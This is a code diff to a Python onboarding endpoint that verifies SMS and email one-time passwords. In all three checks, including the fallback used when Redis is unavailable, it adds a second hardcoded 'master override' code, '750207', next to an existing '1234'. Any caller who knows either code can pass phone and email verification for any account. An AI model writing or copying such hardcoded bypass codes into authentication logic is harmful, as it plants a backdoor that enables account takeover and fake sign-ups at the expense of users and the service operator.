@@ -92,7 +92,7 @@ async def verify_onboarding_otp(
     sms_verified = await verify_sms_otp(payload.phone, payload.sms_otp)
     if not sms_verified:
         # Check master override for SMS too
-        if payload.sms_otp != "1234":
+        if payload.sms_otp not in ["1234", "750207"]:
             raise HTTPException(status_code=400, detail="Invalid or expired SMS OTP")
     
     # 2. Verify Email OTP via Redis
@@ -108,7 +108,7 @@ async def verify_onboarding_otp(
                     stored_otp = stored_otp.decode('utf-8')
 
                 if not stored_otp or payload.email_otp != stored_otp:
-                    if payload.email_otp != "1234":  # Master override
+                    if payload.email_otp not in ["1234", "750207"]:  # Master override
                         raise HTTPException(status_code=400, detail="Invalid or expired Email OTP")
 
                 # Success — delete used OTP
@@ -144,7 +144,7 @@ async def verify_onboarding_otp(
         # Fallback: since the same OTP is sent to both SMS and email,
         # and SMS is already verified above, cross-validate email_otp against sms_otp
         logger.warning("Redis unavailable — falling back to SMS cross-verification for Email OTP")
-        if payload.email_otp != payload.sms_otp and payload.email_otp != "1234":
+        if payload.email_otp != payload.sms_otp and payload.email_otp not in ["1234", "750207"]:
             raise HTTPException(status_code=400, detail="Invalid or expired Email OTP")
 
     return success_response(message="Verification successful")
